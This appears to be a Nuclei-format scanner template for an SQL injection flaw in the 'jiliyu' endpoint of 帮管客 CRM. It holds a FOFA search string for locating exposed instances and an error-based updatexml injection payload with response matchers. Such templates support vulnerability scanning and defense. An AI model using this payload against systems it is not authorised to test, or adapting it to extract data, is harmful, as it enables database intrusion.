id: poc-yaml-bang-guan-ke-crm-jiliyu-sqli
info:
  name: 帮管客 CRM jiliyu SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: 帮管客 CRM
    fofa: app="帮管客-CRM"

variables:
  r1: "{{rand_int(1,10000)}}"
  r2: "{{md5(r1)}}"

http:
  - method: GET
    path:
      - "/index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7e,(select%20md5({{r1}})),0x7e),1))"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "{{r2}}"
